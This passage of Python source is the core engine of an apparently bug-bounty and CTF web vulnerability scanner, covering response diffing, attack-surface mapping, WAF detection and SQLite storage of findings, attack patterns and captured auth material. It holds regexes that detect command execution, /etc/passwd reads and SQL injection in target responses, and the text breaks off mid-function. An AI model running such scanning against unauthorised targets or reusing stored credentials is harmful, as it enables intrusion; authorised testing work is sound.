"""Core security testing engine.

Systematic payload testing with response diffing, attack surface mapping,
SQLite-backed state persistence, request pacing, WAF backoff, and an
orchestration layer for automated endpoint scanning.
"""

from __future__ import annotations

import contextlib
import json
import os
import re
import sqlite3
import time
from collections.abc import Mapping
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import TYPE_CHECKING, Any, ClassVar, Final
from urllib.parse import ParseResult, urljoin, urlparse

import requests
import urllib3

from bugbounty_ctf.audit_log import AuditLog
from bugbounty_ctf.scope import OutOfScopeError, ScopeGuard

if TYPE_CHECKING:
    # Type-only import: engine must not hard-depend on patterns at runtime
    # (patterns imports nothing from engine, but the pattern store methods take
    # the concrete type) — the actual class is imported lazily inside methods.
    from bugbounty_ctf.patterns import AttackPattern


@dataclass(frozen=True)
class TestResult:
    """Structured result from a single payload test."""

    payload: str
    confirmed: bool
    interesting: bool
    indicators: list[str] = field(default_factory=list)
    details: list[str] = field(default_factory=list)
    status_code: int = 0
    response_length: int = 0
    vuln_type: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "payload": self.payload,
            "confirmed": self.confirmed,
            "interesting": self.interesting,
            "indicators": self.indicators,
            "details": self.details,
            "status_code": self.status_code,
            "response_length": self.response_length,
            "vuln_type": self.vuln_type,
        }


@dataclass
class DiffAnalysis:
    """Result of comparing a baseline response against a test response."""

    status_changed: bool
    length_diff: int
    timing_diff: float
    content_differs: bool
    interesting: bool
    indicators: list[str] = field(default_factory=list)
    differences: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "status_changed": self.status_changed,
            "length_diff": self.length_diff,
            "timing_diff": self.timing_diff,
            "content_differs": self.content_differs,
            "interesting": self.interesting,
            "indicators": self.indicators,
            "differences": self.differences,
        }


def response_time(resp: requests.Response) -> float:
    """Best-effort response time in seconds.

    Prefers the time ``SecurityScanner._make_request`` measures and stamps onto
    the response; falls back to requests' native ``elapsed`` so a response that
    never passed through the scanner (a mock, or an externally built
    ``requests.Response``) still reports a real value instead of silently 0.0.
    """
    rt = getattr(resp, "response_time", None)
    if isinstance(rt, (int, float)):
        return float(rt)
    elapsed = getattr(resp, "elapsed", None)
    try:
        return elapsed.total_seconds() if elapsed is not None else 0.0
    except AttributeError:
        return 0.0


class ResponseDiff:
    """Compare two HTTP responses and identify meaningful differences."""

    CONTENT_PATTERNS: ClassVar[dict[str, list[str]]] = {
        "sql_error": [
            r"SQL syntax",
            r"You have an error in your SQL",
            r"sqlite3\.OperationalError",
            r"pymysql\.err",
            r"psycopg2\.ProgrammingError",
            r"ORA-\d+",
        ],
        "command_output": [r"uid=\d+", r"gid=\d+", r"groups=\d+", r"root:", r"bin:", r"daemon:"],
        "file_contents": [r"/bin/bash", r"/usr/sbin/nologin", r"root:x:0:0"],
        "ssti_evaluated": [r"\b49\b", r"\b343\b"],
        "xxe_triggered": [r"root:x:0:", r"daemon:x:1:", r"bin:x:2:"],
        "auth_bypass": [r"welcome", r"dashboard", r"admin panel", r"authenticated"],
        "info_leak": [r"version", r"stack trace", r"traceback", r"debug", r"error in"],
        "flag_found": [r"flag\{", r"CTF\{", r"pwn\{", r"secret\{", r"key\{"],
    }

    WAF_PATTERNS: ClassVar[list[str]] = [
        r"blocked",
        r"forbidden",
        r"rate.limit",
        r"too.many",
        r"cloudflare",
        r"akamai",
        r"incapsula",
        r"mod.security",
        r"request.blocked",
    ]

    def __init__(self, baseline: requests.Response, test_response: requests.Response) -> None:
        self.baseline = baseline
        self.test = test_response
        self.differences: list[str] = []
        self.interesting = False
        self.indicators: list[str] = []

    def analyze(self) -> DiffAnalysis:
        """Run all diff checks and return analysis."""
        self._check_status_code()
        self._check_length()
        self._check_timing()
        self._check_content()
        self._check_errors()
        self._check_redirects()
        self._check_headers()
        self._check_security_indicators()

        return DiffAnalysis(
            status_changed=self.baseline.status_code != self.test.status_code,
            length_diff=abs(len(self.baseline.text) - len(self.test.text)),
            timing_diff=response_time(self.test) - response_time(self.baseline),
            content_differs=self.baseline.text != self.test.text,
            interesting=self.interesting,
            indicators=self.indicators,
            differences=self.differences,
        )

    def _check_status_code(self) -> None:
        if self.baseline.status_code != self.test.status_code:
            self.differences.append(
                f"Status: {self.baseline.status_code} → {self.test.status_code}"
            )
            self.interesting = True
            self.indicators.append("status_code_change")

    def _check_length(self) -> None:
        base_len = len(self.baseline.text)
        test_len = len(self.test.text)
        diff = abs(test_len - base_len)

        if base_len > 0 and diff / base_len > 0.05:
            self.differences.append(f"Length: {base_len} → {test_len} ({diff:+d} bytes)")
            self.interesting = True
            self.indicators.append("length_change")
        elif base_len == 0 and test_len > 100:
            self.differences.append(f"Length: 0 → {test_len}")
            self.interesting = True
            self.indicators.append("content_appeared")

    def _check_timing(self) -> None:
        base_time = response_time(self.baseline)
        test_time = response_time(self.test)

        if test_time > base_time * 2 and test_time > 1.0:
            self.differences.append(f"Timing: {base_time:.3f}s → {test_time:.3f}s")
            self.interesting = True
            self.indicators.append("timing_delay")

    def _check_content(self) -> None:
        """Check for content patterns that are NEW in the test response (not in baseline)."""
        for category, regexes in self.CONTENT_PATTERNS.items():
            for regex in regexes:
                in_test = bool(re.search(regex, self.test.text, re.IGNORECASE))
                in_baseline = bool(re.search(regex, self.baseline.text, re.IGNORECASE))
                if in_test and not in_baseline:
                    self.indicators.append(category)
                    self.interesting = True
                    self.differences.append(f"Pattern found: {category}")
                    break

    def _check_errors(self) -> None:
        """Detect application error responses that weren't in baseline.

        Excludes generic parser error messages (YAML parse error, JSON parse error)
        to avoid false positives when testing payloads that are invalid input
        formats but not actual application errors.
        """
        error_patterns = [r"error", r"exception", r"failed", r"invalid", r"denied", r"forbidden"]

        parser_error_patterns = [
            r"parse error",
            r"syntax error",
            r"could not parse",
            r"unexpected token",
        ]

        baseline_has_error = any(
            re.search(p, self.baseline.text, re.IGNORECASE) for p in error_patterns
        )
        test_has_error = any(re.search(p, self.test.text, re.IGNORECASE) for p in error_patterns)

        test_has_parser_error = any(
            re.search(p, self.test.text, re.IGNORECASE) for p in parser_error_patterns
        )

        if test_has_error and not baseline_has_error and not test_has_parser_error:
            self.differences.append("New error message detected")
            self.interesting = True
            self.indicators.append("error_appeared")

    def _check_redirects(self) -> None:
        if self.test.status_code in (301, 302, 303, 307, 308):
            location = self.test.headers.get("Location", "")
            self.differences.append(f"Redirect to: {location}")
            self.interesting = True
            self.indicators.append("redirect")

    def _check_headers(self) -> None:
        """Check for interesting header changes."""
        interesting_headers = [
            "set-cookie",
            "x-powered-by",
            "server",
            "access-control-allow-origin",
        ]

        for header in interesting_headers:
            base_val = self.baseline.headers.get(header, "")
            test_val = self.test.headers.get(header, "")
            if base_val != test_val:
                self.differences.append(f"Header {header}: '{base_val}' → '{test_val}'")
                if header == "set-cookie":
                    self.interesting = True
                    self.indicators.append("cookie_set")

    def _check_security_indicators(self) -> None:
        """Check for WAF responses, rate limiting, etc."""
        for pattern in self.WAF_PATTERNS:
            if re.search(pattern, self.test.text, re.IGNORECASE) and not re.search(
                pattern, self.baseline.text, re.IGNORECASE
            ):
                self.differences.append(f"Defense triggered: {pattern}")
                self.indicators.append("defense_triggered")
                break


# Regex patterns for HTML parsing — attribute order agnostic.
_FORM_RE = re.compile(r"<form([^>]*)>(.*?)</form>", re.DOTALL | re.IGNORECASE)
_FORM_ATTR_RE = re.compile(r'(method|action)\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)
_INPUT_RE = re.compile(
    r'<input[^>]*name\s*=\s*["\']([^"\']*)["\'][^>]*'
    r'(?:value\s*=\s*["\']([^"\']*)["\'][^>]*)?',
    re.IGNORECASE,
)
_TEXTAREA_RE = re.compile(
    r'<textarea[^>]*name\s*=\s*["\']([^"\']*)["\']',
    re.IGNORECASE,
)
_SELECT_RE = re.compile(
    r'<select[^>]*name\s*=\s*["\']([^"\']*)["\']',
    re.IGNORECASE,
)
_HREF_RE = re.compile(r'href\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)

_NOISE_PATTERNS = [
    re.compile(r'name="csrf[_\-]?token"\s+value="[^"]*"', re.IGNORECASE),
    re.compile(r'name="_token"\s+value="[^"]*"', re.IGNORECASE),
    re.compile(r'name="__VIEWSTATE"\s+value="[^"]*"', re.IGNORECASE),
    re.compile(r'name="__EVENTVALIDATION"\s+value="[^"]*"', re.IGNORECASE),
    re.compile(r'name="csrfmiddlewaretoken"\s+value="[^"]*"', re.IGNORECASE),
    re.compile(r'csrf[_\-]?token["\']?\s*[:=]\s*["\'][^"\']*["\']', re.IGNORECASE),
    re.compile(r'nonce["\']?\s*[:=]\s*["\'][^"\']+["\']', re.IGNORECASE),
    re.compile(r'timestamp["\']?\s*[:=]\s*["\']?\d{10,}["\']?', re.IGNORECASE),
]

_DEFAULT_SCHEME_PORTS = {"http": 80, "https": 443}
_DB_FILE_MODE: Final = 0o600
_DB_OPEN_FLAGS: Final = os.O_RDWR | os.O_CREAT | getattr(os, "O_NOFOLLOW", 0)


def _parsed_port(parsed: ParseResult) -> int | None:
    try:
        return parsed.port
    except ValueError:
        return None


def _url_has_explicit_port(parsed: ParseResult) -> bool:
    host_part = parsed.netloc.rsplit("@", 1)[-1]
    if host_part.startswith("["):
        return "]:" in host_part
    return ":" in host_part


def _host_header_name(host: str) -> str:
    if ":" in host and not host.startswith("["):
        return f"[{host}]"
    return host


def _target_vhost(parsed: ParseResult, host: str, port: int) -> str:
    if _url_has_explicit_port(parsed):
        return f"{_host_header_name(host)}:{port}"
    return _host_header_name(host)


def _host_header(headers: Mapping[str, str]) -> str | None:
    for name, value in headers.items():
        if name.lower() == "host":
            normalized = value.strip().lower()
            return normalized or None
    return None


def _scanner_target_identity(base_url: str, headers: Mapping[str, str]) -> str:
    """Build the ScannerDB key from non-secret target routing fields only.

    Legacy bare-host rows are intentionally ignored because falling back to
    them would reintroduce cross-target contamination.
    """
    parsed = urlparse(base_url)
    scheme = (parsed.scheme or "unknown").lower()
    host = (parsed.hostname or "unknown").lower()
    port = _parsed_port(parsed) or _DEFAULT_SCHEME_PORTS.get(scheme, 0)
    vhost = _host_header(headers) or _target_vhost(parsed, host, port)
    return f"scheme={scheme};host={host};port={port};vhost={vhost}"


def _strip_noise(text: str) -> str:
    """Strip dynamic noise (CSRF tokens, nonces, timestamps) from response text."""
    cleaned = text
    for pattern in _NOISE_PATTERNS:
        cleaned = pattern.sub("", cleaned)
    return cleaned


def _similarity_ratio(a: str, b: str) -> float:
    """Compute text similarity ratio between two strings, ignoring noise."""
    from difflib import SequenceMatcher

    clean_a = _strip_noise(a)
    clean_b = _strip_noise(b)
    return SequenceMatcher(None, clean_a, clean_b).ratio()


def _extract_form_attrs(form_tag: str) -> dict[str, str]:
    """Extract method and action attributes from a <form ...> tag, order-agnostic."""
    attrs: dict[str, str] = {}
    for match in _FORM_ATTR_RE.finditer(form_tag):
        attrs[match.group(1).lower()] = match.group(2)
    return attrs


def _default_db_path() -> str:
    return os.path.expanduser("~/.hermes/bugbounty.db")


def _default_state_file(base_url: str) -> str:
    """Per-target state file — prevents overwriting target A's state when testing target B."""
    host = urlparse(base_url).hostname or "unknown"
    safe_host = re.sub(r"[^a-zA-Z0-9._-]", "", host)
    return os.path.expanduser(f"~/.hermes/state/{safe_host}.json")


def _can_chmod_db_path(db_path: str) -> bool:
    return os.name != "nt" and db_path != ":memory:" and not db_path.startswith("file:")


class DatabaseSecurityError(RuntimeError):
    def __str__(self) -> str:
        return "Could not secure database file permissions"


def _secure_db_file(db_path: str) -> None:
    if not _can_chmod_db_path(db_path):
        return

    try:
        fd = os.open(db_path, _DB_OPEN_FLAGS, _DB_FILE_MODE)
        try:
            os.fchmod(fd, _DB_FILE_MODE)
        finally:
            os.close(fd)
    except OSError:
        raise DatabaseSecurityError() from None


def _create_findings_table(conn: sqlite3.Connection) -> None:
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS findings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_host TEXT NOT NULL,
            endpoint TEXT NOT NULL,
            method TEXT,
            payload TEXT,
            vuln_type TEXT,
            confidence REAL DEFAULT 0.0,
            indicators TEXT DEFAULT '[]',
            details TEXT DEFAULT '[]',
            timestamp TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_findings_host ON findings(target_host);
        CREATE INDEX IF NOT EXISTS idx_findings_type ON findings(vuln_type);
    """)


def _create_history_tables(conn: sqlite3.Connection) -> None:
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS test_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_host TEXT NOT NULL,
            endpoint TEXT NOT NULL,
            method TEXT,
            payload TEXT,
            interesting INTEGER DEFAULT 0,
            indicators TEXT DEFAULT '[]',
            timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS attack_surface (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_host TEXT NOT NULL,
            start_url TEXT NOT NULL,
            surface_json TEXT NOT NULL,
            timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS defenses (
            target_host TEXT PRIMARY KEY,
            defenses_json TEXT NOT NULL,
            timestamp TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_history_host ON test_history(target_host);
    """)


def _create_observations_table(conn: sqlite3.Connection) -> None:
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS observations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_host TEXT NOT NULL,
            obs_json TEXT NOT NULL,
            vuln_type TEXT,
            endpoint TEXT,
            confidence REAL DEFAULT 0.0,
            timestamp TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_obs_host ON observations(target_host);
    """)


def _create_hypotheses_table(conn: sqlite3.Connection) -> None:
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS hypotheses (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_host TEXT NOT NULL,
            vuln_type TEXT,
            endpoint TEXT,
            param TEXT,
            status TEXT,
            confidence REAL DEFAULT 0.0,
            hyp_json TEXT NOT NULL,
            timestamp TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_hyp_host ON hypotheses(target_host);
    """)


def _create_patterns_table(conn: sqlite3.Connection) -> None:
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS patterns (
            pattern_id TEXT PRIMARY KEY,
            trigger_json TEXT,
            steps_json TEXT,
            outcome TEXT,
            confidence REAL DEFAULT 0.0,
            applied INTEGER DEFAULT 0,
            worked INTEGER DEFAULT 0,
            failed INTEGER DEFAULT 0,
            provenance_json TEXT DEFAULT '[]',
            created_at TEXT,
            last_seen TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_patterns_outcome ON patterns(outcome);
    """)


def _create_auth_material_table(conn: sqlite3.Connection) -> None:
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS auth_material (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_identity TEXT NOT NULL,
            kind TEXT NOT NULL,
            name TEXT NOT NULL,
            value TEXT NOT NULL,
            source TEXT NOT NULL DEFAULT '',
            timestamp TEXT,
            UNIQUE(target_identity, kind, name, value, source)
        );
        CREATE INDEX IF NOT EXISTS idx_auth_material_target
            ON auth_material(target_identity, kind);
    """)


def _scan_prepare(
    url: str,
    method: str,
    data: dict[str, str] | None,
    headers: dict[str, str] | None,
    cookies: dict[str, str] | None,
) -> dict[str, Any]:
    is_post = method.upper() in ("POST", "PUT", "PATCH")
    test_data = data or {}
    request_kwargs: dict[str, Any] = {"data": test_data} if is_post else {"params": test_data}
    if headers is not None:
        request_kwargs["headers"] = headers
    if cookies is not None:
        request_kwargs["cookies"] = cookies
    test_param = next(iter(test_data.keys())) if test_data else None
    return {
        "url": url,
        "method": method,
        "is_post": is_post,
        "test_data": test_data,
        "request_kwargs": request_kwargs,
        "test_param": test_param,
    }


def _scan_execute(
    url: str,
    method: str,
    prepared: dict[str, Any],
    session: SecurityScanner,
) -> requests.Response:
    return session._make_request(method, url, **prepared["request_kwargs"])


def _scan_analyze(url: str, response: requests.Response, state: dict[str, Any]) -> TestResult:
    vuln_type = state["vuln_type"]
    tr = SecurityScanner._to_test_result(state["raw"], vuln_type)
    is_confirmed = confirm_vulnerability(
        vuln_type,
        response.text,
        state["baseline_text"],
        state["payload_value"],
    )
    result = TestResult(
        payload=tr.payload,
        confirmed=is_confirmed,
        interesting=tr.interesting,
        indicators=tr.indicators,
        details=tr.details,
        status_code=response.status_code,
        response_length=len(response.text),
        vuln_type=vuln_type,
    )
    scanner = state.get("scanner")
    if is_confirmed and scanner is not None:
        scanner._record_finding(
            url,
            state["method"],
            result.payload,
            result.indicators,
            result.details,
            vuln_type,
        )
    return result


class ScannerDB:
    """SQLite-backed persistence for scanner findings, history, and attack surface."""

    def __init__(self, db_path: str | None = None) -> None:
        self.db_path = db_path or _default_db_path()
        # ":memory:" and bare filenames have no directory component.
        parent = os.path.dirname(self.db_path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        self._conn: sqlite3.Connection | None = None
        self._init_schema()

    @property
    def conn(self) -> sqlite3.Connection:
        if self._conn is None:
            _secure_db_file(self.db_path)
            self._conn = sqlite3.connect(self.db_path)
            self._conn.row_factory = sqlite3.Row
        return self._conn

    def _init_schema(self) -> None:
        conn = self.conn
        _create_findings_table(conn)
        _create_history_tables(conn)
        _create_observations_table(conn)
        _create_hypotheses_table(conn)
        _create_patterns_table(conn)
        _create_auth_material_table(conn)
        conn.commit()
        self._migrate()

    def _migrate(self) -> None:
        """Idempotent column migrations for DBs created by older versions."""
        cols = {row["name"] for row in self.conn.execute("PRAGMA table_info(findings)")}
        if "source" not in cols:
            # Provenance: which methodology/doc led to this finding.
            self.conn.execute("ALTER TABLE findings ADD COLUMN source TEXT DEFAULT ''")
            self.conn.commit()

        # Cross-engagement PATTERN tier (surface-keyed generalized chains). DBs
        # created before this tier existed lack the table; create it idempotently
        # so they pick it up without a destructive rebuild.
        has_patterns = self.conn.execute(
            "SELECT name FROM sqlite_master WHERE type='table' AND name='patterns'"
        ).fetchone()
        if has_patterns is None:
            self.conn.executescript("""
                CREATE TABLE IF NOT EXISTS patterns (
                    pattern_id TEXT PRIMARY KEY,
                    trigger_json TEXT,
                    steps_json TEXT,
                    outcome TEXT,
                    confidence REAL DEFAULT 0.0,
                    applied INTEGER DEFAULT 0,
                    worked INTEGER DEFAULT 0,
                    failed INTEGER DEFAULT 0,
                    provenance_json TEXT DEFAULT '[]',
                    created_at TEXT,
                    last_seen TEXT
                );
                CREATE INDEX IF NOT EXISTS idx_patterns_outcome ON patterns(outcome);
            """)
            self.conn.commit()

    def save_finding(
        self,
        target_host: str,
        endpoint: str,
        vuln_type: str,
        method: str = "",
        payload: str = "",
        confidence: float = 0.0,
        indicators: list[str] | None = None,
        details: list[str] | None = None,
        source: str = "",
    ) -> None:
        """Persist a finding, de-duplicated on (host, endpoint, vuln_type, payload).

        Re-running a scan re-discovers the same vulns; without dedup the findings
        table — the toolkit's cross-run memory — fills with duplicate rows and
        recall surfaces noise. A repeat refreshes confidence/details/timestamp
        in place instead of appending.
        """
        now = datetime.now().isoformat()
        existing = self.conn.execute(
            """SELECT id FROM findings
               WHERE target_host = ? AND endpoint = ? AND vuln_type = ? AND payload = ?""",
            (target_host, endpoint, vuln_type, payload),
        ).fetchone()
        if existing is not None:
            # Keep an existing non-empty source if this call doesn't supply one.
            set_source = ", source = ?" if source else ""
            params: tuple[Any, ...] = (
                method,
                confidence,
                json.dumps(indicators or []),
                json.dumps(details or []),
                now,
                *((source,) if source else ()),
                existing["id"],
            )
            self.conn.execute(
                f"""UPDATE findings SET method = ?, confidence = ?, indicators = ?,
                    details = ?, timestamp = ?{set_source} WHERE id = ?""",
                params,
            )
        else:
            self.conn.execute(
                """INSERT INTO findings (target_host, endpoint, method, payload, vuln_type,
                   confidence, indicators, details, timestamp, source)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (
                    target_host,
                    endpoint,
                    method,
                    payload,
                    vuln_type,
                    confidence,
                    json.dumps(indicators or []),
                    json.dumps(details or []),
                    now,
                    source,
                ),
            )
        self.conn.commit()

    def findings_for_host(self, target_host: str, limit: int = 50) -> list[dict[str, Any]]:
        """Recall prior findings for a host (most recent first) — cross-run memory."""
        rows = self.conn.execute(
            "SELECT * FROM findings WHERE target_host = ? ORDER BY timestamp DESC LIMIT ?",
            (target_host, limit),
        ).fetchall()
        return [dict(r) for r in rows]

    def save_history(
        self,
        target_host: str,
        endpoint: str,
        method: str,
        payload: str,
        interesting: bool,
        indicators: list[str] | None = None,
    ) -> None:
        self.conn.execute(
            """INSERT INTO test_history (target_host, endpoint, method, payload,
               interesting, indicators, timestamp)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (
                target_host,
                endpoint,
                method,
                payload,
                int(interesting),
                json.dumps(indicators or []),
                datetime.now().isoformat(),
            ),
        )
        self.conn.commit()

    def save_surface(self, target_host: str, start_url: str, surface: dict[str, Any]) -> None:
        self.conn.execute(
            """INSERT INTO attack_surface (target_host, start_url, surface_json, timestamp)
               VALUES (?, ?, ?, ?)""",
            (target_host, start_url, json.dumps(surface), datetime.now().isoformat()),
        )
        self.conn.commit()

    def latest_surface_for_host(self, target_host: str) -> dict[str, Any]:
        """Rebuild the attack_surface map (start_url → surface) from the DB.

        ``save_surface`` appends a row each time a path is (re-)mapped; this
        returns the most recent surface for every distinct ``start_url`` so the
        DB is an authoritative reload source for the in-memory map.
        """
        rows = self.conn.execute(
            """SELECT start_url, surface_json FROM attack_surface
               WHERE target_host = ? ORDER BY id ASC""",
            (target_host,),
        ).fetchall()
        surface: dict[str, Any] = {}
        for row in rows:
            try:
                surface[row["start_url"]] = json.loads(row["surface_json"])
            except (json.JSONDecodeError, ValueError):
                continue
        return surface

    def save_defenses(self, target_host: str, defenses: list[str]) -> None:
        """Persist the detected-defenses list for a host (one row per host)."""
        self.conn.execute(
            """INSERT INTO defenses (target_host, defenses_json, timestamp)
               VALUES (?, ?, ?)
               ON CONFLICT(target_host) DO UPDATE SET
                   defenses_json = excluded.defenses_json,
                   timestamp = excluded.timestamp""",
            (target_host, json.dumps(defenses), datetime.now().isoformat()),
        )
        self.conn.commit()

    def defenses_for_host(self, target_host: str) -> list[str]:
        row = self.conn.execute(
            "SELECT defenses_json FROM defenses WHERE target_host = ?",
            (target_host,),
        ).fetchone()
        if row is None:
            return []
        try:
            value = json.loads(row["defenses_json"])
        except (json.JSONDecodeError, ValueError):
            return []
        return list(value) if isinstance(value, list) else []

    def save_auth_material(
        self,
        target_identity: str,
        kind: str,
        name: str,
        value: str,
        source: str = "",
    ) -> None:
        self.conn.execute(
            "INSERT OR IGNORE INTO auth_material "
            "(target_identity, kind, name, value, source, timestamp) "
            "VALUES (?, ?, ?, ?, ?, ?)",
            (target_identity, kind, name, value, source, datetime.now().isoformat()),
        )
        self.conn.commit()

    def load_auth_material(self, target_identity: str) -> list[dict[str, str]]:
        rows = self.conn.execute(
            "SELECT kind, name, value, source FROM auth_material "
            "WHERE target_identity = ? ORDER BY id ASC",
            (target_identity,),
        ).fetchall()
        return [
            {
                "kind": row["kind"],
                "name": row["name"],
                "value": row["value"],
                "source": row["source"],
            }
            for row in rows
        ]

    def query_findings(self, where: str = "", params: tuple[Any, ...] = ()) -> list[dict[str, Any]]:
        sql = "SELECT * FROM findings"
        if where:
            sql += f" WHERE {where}"
        sql += " ORDER BY timestamp DESC"
        rows = self.conn.execute(sql, params).fetchall()
        return [dict(r) for r in rows]

    def query_history(self, where: str = "", params: tuple[Any, ...] = ()) -> list[dict[str, Any]]:
        sql = "SELECT * FROM test_history"
        if where:
            sql += f" WHERE {where}"
        sql += " ORDER BY timestamp DESC LIMIT 500"
        rows = self.conn.execute(sql, params).fetchall()
        return [dict(r) for r in rows]

    def prune_history(self, target_host: str, keep: int = 2000) -> int:
        """Trim a host's test_history to the most recent ``keep`` rows.

        test_history is an append-only log that otherwise grows without bound;
        pruning keeps the DB (the second-brain store) from accumulating stale
        noise. Returns the number of rows deleted.
        """
        cur = self.conn.execute(
            """DELETE FROM test_history
               WHERE target_host = ? AND id NOT IN (
                   SELECT id FROM test_history WHERE target_host = ?
                   ORDER BY id DESC LIMIT ?
               )""",
            (target_host, target_host, keep),
        )
        self.conn.commit()
        return cur.rowcount

    # ------------------------------------------------------------------ memory
    def save_observation(self, target_host: str, obs: dict[str, Any]) -> None:
        """Persist a structured observation (durable reasoning memory)."""
        self.conn.execute(
            """INSERT INTO observations
               (target_host, obs_json, vuln_type, endpoint, confidence, timestamp)
               VALUES (?, ?, ?, ?, ?, ?)""",
            (
                target_host,
                json.dumps(obs, default=str),
                obs.get("vuln_type", ""),
                obs.get("endpoint", ""),
                float(obs.get("confidence", 0.0)),
                obs.get("timestamp") or datetime.now().isoformat(),
            ),
        )
        self.conn.commit()

    def query_observations(
        self, target_host: str, *, min_confidence: float = 0.0, limit: int = 200
    ) -> list[dict[str, Any]]:
        rows = self.conn.execute(
            """SELECT obs_json FROM observations
               WHERE target_host = ? AND confidence >= ?
               ORDER BY id DESC LIMIT ?""",
            (target_host, min_confidence, limit),
        ).fetchall()
        return [json.loads(r["obs_json"]) for r in rows]

    def save_hypothesis(self, target_host: str, hyp: dict[str, Any]) -> None:
        """Persist a hypothesis with its status (confirmed/rejected/pending)."""
        status = (
            "confirmed"
            if hyp.get("confirmed")
            else "rejected"
            if hyp.get("rejected")
            else "pending"
        )
        self.conn.execute(
            """INSERT INTO hypotheses
               (target_host, vuln_type, endpoint, param, status, confidence, hyp_json, timestamp)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                target_host,
                hyp.get("vuln_type", ""),
                hyp.get("endpoint", ""),
                hyp.get("param", ""),
                status,
                float(hyp.get("confidence", 0.0)),
                json.dumps(hyp, default=str),
                datetime.now().isoformat(),
            ),
        )
        self.conn.commit()

    def query_hypotheses(
        self, target_host: str, *, status: str | None = None, limit: int = 200
    ) -> list[dict[str, Any]]:
        if status:
            rows = self.conn.execute(
                """SELECT hyp_json FROM hypotheses
                   WHERE target_host = ? AND status = ? ORDER BY id DESC LIMIT ?""",
                (target_host, status, limit),
            ).fetchall()
        else:
            rows = self.conn.execute(
                "SELECT hyp_json FROM hypotheses WHERE target_host = ? ORDER BY id DESC LIMIT ?",
                (target_host, limit),
            ).fetchall()
        return [json.loads(r["hyp_json"]) for r in rows]

    # ----------------------------------------------------------- pattern tier
    def save_pattern(self, pattern: AttackPattern) -> None:
        """Persist a generalized attack pattern, merging on ``pattern_id``.

        Mirrors :meth:`save_finding`'s dedup-and-refresh. A pattern_id collision
        means the *same generalized chain over the same surface* was seen again
        (possibly on a different box): counts ACCUMULATE (applied/worked/failed
        add), provenance UNIONS, ``last_seen`` refreshes to the incoming value,
        and confidence is recomputed from the merged worked/failed via
        :func:`patterns.beta_confidence`. On first sight it is stored as-is.

        The store only ever holds what :class:`patterns.PatternGuard` produced —
        this method never validates content (the guard already did, fail-closed).
        """
        from bugbounty_ctf.patterns import beta_confidence

        trigger = {
            "ports": list(pattern.ports),
            "tech": list(pattern.tech),
            "capabilities": list(pattern.capabilities),
        }
        steps_json = json.dumps([s.to_dict() for s in pattern.steps])
        existing = self.conn.execute(
            """SELECT applied, worked, failed, provenance_json
               FROM patterns WHERE pattern_id = ?""",
            (pattern.pattern_id,),
        ).fetchone()
        if existing is not None:
            applied = existing["applied"] + pattern.applied
            worked = existing["worked"] + pattern.worked
            failed = existing["failed"] + pattern.failed
            try:
                prior_prov = json.loads(existing["provenance_json"] or "[]")
            except (json.JSONDecodeError, ValueError):
                prior_prov = []
            # Union provenance, preserving first-seen order.
            merged_prov = list(dict.fromkeys([*prior_prov, *pattern.provenance]))
            self.conn.execute(
                """UPDATE patterns SET trigger_json = ?, steps_json = ?, outcome = ?,
                   confidence = ?, applied = ?, worked = ?, failed = ?,
                   provenance_json = ?, last_seen = ? WHERE pattern_id = ?""",
                (
                    json.dumps(trigger),
                    steps_json,
                    pattern.outcome,
                    beta_confidence(worked, failed),
                    applied,
                    worked,
                    failed,
                    json.dumps(merged_prov),
                    pattern.last_seen,
                    pattern.pattern_id,
                ),
            )
        else:
            self.conn.execute(
                """INSERT INTO patterns (pattern_id, trigger_json, steps_json, outcome,
                   confidence, applied, worked, failed, provenance_json, created_at, last_seen)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (
                    pattern.pattern_id,
                    json.dumps(trigger),
                    steps_json,
                    pattern.outcome,
                    pattern.confidence,
                    pattern.applied,
                    pattern.worked,
                    pattern.failed,
                    json.dumps(list(pattern.provenance)),
                    pattern.created_at,
                    pattern.last_seen,
                ),
            )
        self.conn.commit()

    def match_patterns(
        self,
        ports: tuple[int, ...],
        tech: tuple[str, ...],
        capabilities: tuple[str, ...],
        *,
        limit: int = 200,
    ) -> list[AttackPattern]:
        """Return candidate patterns ordered by confidence then proven wins.

        Returns ALL stored candidates (up to ``limit``) — surface-aware Jaccard
        ranking against ``ports``/``tech``/``capabilities`` is the caller's job
        via :func:`patterns.rank_patterns`. The args document the recall surface
        and reserve the signature for a later index-narrowed query.
        """
        from bugbounty_ctf.patterns import AttackPattern as _AttackPattern

        rows = self.conn.execute(
            """SELECT * FROM patterns
               ORDER BY confidence DESC, worked DESC LIMIT ?""",
            (limit,),
        ).fetchall()
        results: list[AttackPattern] = []
        for row in rows:
            try:
                trigger = json.loads(row["trigger_json"] or "{}")
                steps = json.loads(row["steps_json"] or "[]")
                provenance = json.loads(row["provenance_json"] or "[]")
            except (json.JSONDecodeError, ValueError):
                continue
            results.append(
                _AttackPattern.from_dict(
                    {
                        "pattern_id": row["pattern_id"],
                        "ports": trigger.get("ports", []),
                        "tech": trigger.get("tech", []),
